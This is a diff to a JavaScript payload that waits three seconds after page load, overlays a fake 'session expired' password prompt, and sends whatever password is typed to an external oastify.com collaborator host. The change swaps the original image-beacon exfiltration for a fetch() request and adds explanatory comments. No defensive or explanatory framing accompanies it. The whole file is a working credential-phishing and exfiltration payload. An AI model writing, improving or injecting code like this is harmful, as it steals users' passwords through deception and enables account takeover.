@@ -1,5 +1,6 @@
 window.addEventListener('load', function() {
     setTimeout(function() {
+        // Create the session expired prompt
         let message = document.createElement('div');
         message.style.position = 'fixed';
         message.style.top = '30%';
@@ -19,14 +20,22 @@ window.addEventListener('load', function() {
         
         document.body.appendChild(message);
 
+        // Add event listener for the submit button using fetch
         document.getElementById('submit').addEventListener('click', function() {
             let password = document.getElementById('password').value;
             if (password) {
-                console.log("Sending password:", password); // Debug
-                let img = new Image();
-                img.src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
-                message.innerHTML = "<p>Loading...</p>";
+                fetch(`https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`, {
+                    method: 'GET', // Matches the original behavior of an image request
+                    mode: 'no-cors' // Use this if you don’t need the response, just to send the request
+                })
+                .then(() => {
+                    message.innerHTML = "<p>Loading...</p>"; // Update UI after successful request
+                })
+                .catch(error => {
+                    console.error("Fetch error:", error); // Log any issues
+                    message.innerHTML = "<p>Error occurred. Please try again.</p>";
+                });
             }
         });
-    }, 3000);
+    }, 3000); // Delay the prompt for 3 seconds
 });
